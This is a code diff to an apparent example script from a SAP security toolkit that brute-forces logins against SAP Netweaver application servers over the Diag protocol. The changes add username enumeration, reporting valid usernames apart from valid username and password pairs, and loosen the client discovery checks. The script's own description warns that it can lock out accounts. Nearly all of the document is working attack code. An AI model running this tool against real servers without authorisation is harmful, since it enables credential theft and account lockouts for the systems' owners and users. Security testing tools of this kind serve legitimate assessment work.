@@ -55,7 +55,7 @@ def parse_options():
 
     description = "This example script can be used to perform a brute force attack against a SAP Netweaver " \
                   "application server. The scripts performs a login through the Diag protocol. It can also discover " \
-                  "available clients."
+                  "available clients. Consider that this can lock out user accounts and run it at your own risk."
 
     usage = "%(prog)s [options] -d <remote host>"
 
@@ -140,11 +140,11 @@ def is_duplicate_login(response):
 
 
 def login(host, port, terminal, route, username, password, client, verbose, results):
+    """Perform a login try with the username and password. Tries to determine if either the username
+    or the combination of username and password is valid for the given client.
     """
-    Perform a login try with the username and password.
-
-    """
-    success = False
+    user_valid = False
+    login_success = False
     status = ''
 
     # Create the connection to the SAP Netweaver server
@@ -159,29 +159,31 @@ def login(host, port, terminal, route, username, password, client, verbose, resu
         status = response[SAPDiag].get_item("APPL", "ST_R3INFO", "MESSAGE")[0].item_value
         # Check if the password is expired
         if status == "Enter a new password":
-            success = True
+            user_valid = login_success = True
             status = "Expired password"
         elif status == "E: Log on with a dialog user":
-            success = True
+            user_valid = True
+            login_success = False
             status = "No Dialog user (log on with RFC)"
         elif status[:10] == "E: Client ":
-            success = False
+            user_valid = login_success = False
             status = "Client does not exist"
     # Check if the user is already logged in
     elif is_duplicate_login(response)[0]:
         status = is_duplicate_login(response)[1]
-        success = True
+        user_valid = login_success = True
     # If the ST_USER USERNAME item is set to the username, the login was successful
     elif response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME"):
         st_username = response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME")[0].item_value
         if st_username == username:
-            success = True
+            user_valid = login_success = True
     # If the response doesn't contain a message item but the Internal Mode Number is set to 1, we have found a
     # successful login
     elif response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER"):
         imodenumber = response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER")[0].item_value
         if imodenumber == "\x00\x01":
-            success = True
+            user_valid = login_success = True
+
     # Otherwise, we are dealing with an unknown response
     else:
         status = "Unknown error"
@@ -190,34 +192,32 @@ def login(host, port, terminal, route, username, password, client, verbose, resu
     connection.close()
 
     if verbose:
-        print("[*] Results: \tClient: %s\tUsername: %s\tPassword: %s\tValid: %s\tStatus: %s" % (client, username,
-                                                                                                password, success,
-                                                                                                status))
-    results.append((success, status, username, password, client))
+        print("[*] Results: \tClient: %s\tUsername: %s\tPassword: %s\t"
+              "Username Valid: %s\tPassword Valid: %s\tStatus: %s" % (client, username, password,
+                                                                      user_valid, login_success,
+                                                                      status))
+    results.append((user_valid, login_success, status, username, password, client))
 
 
 def discover_client(host, port, terminal, route, client, verbose, results):
     """
     Test if a client is available on the application server, by setting the client and using a
     random username/password, and looking at the response's message.
-
     """
-
-    # Unavailable client
-    unavailable = "E: Client %s is not available in this system"
-
-    # If there's a license issue, all clients report this
-    license_check = "E: Logon not possible (error in license check)"
 
     client = "%03d" % client
     login_results = []
     login(host, port, terminal, route, get_rand(8), get_rand(8), client, verbose, login_results)
-    (_, status, _, _, client) = login_results[0]
+    (_, _, status, _, _, client) = login_results[0]
 
-    if status == license_check:
+    # Check for the positive signs that the client doesn't exist
+    unavailable = "E: Client %s is not available in this system"
+    unexistent = "Client does not exist"
+    license_check = "E: Logon not possible (error in license check)"
+    if status in [license_check, unavailable % client, unexistent]:
         available = False
-    elif status == unavailable % client:
-        available = False
+
+    # Otherwise assume the client does exist to be on the safe side
     else:
         available = True
 
@@ -257,7 +257,7 @@ def main():
             if success:
                 client_list.append(client)
 
-        print("[*] Clients found: %s" % ','.join(client_list))
+        print("[*] Clients found potentially available: %s" % ','.join(client_list))
     else:
         print("[*] Not discovering clients, using %s or client supplied in credentials file" % options.client)
         client_list = options.client.split(',')
@@ -325,8 +325,12 @@ def main():
     pool.wait_completion()
 
     # Print the credentials found
-    for (success, status, username, password, client) in results:
-        if success:
+    for (user_valid, login_success, status, username, password, client) in results:
+        if user_valid and not login_success:
+            print("[+] Valid username found: \tClient: %s\tUsername: %s\tStatus: %s" % (client,
+                                                                                        username,
+                                                                                        status))
+        elif login_success:
             print("[+] Valid credentials found: \tClient: %s\tUsername: %s\tPassword: %s\tStatus: %s" % (client,
                                                                                                          username,
                                                                                                          password,
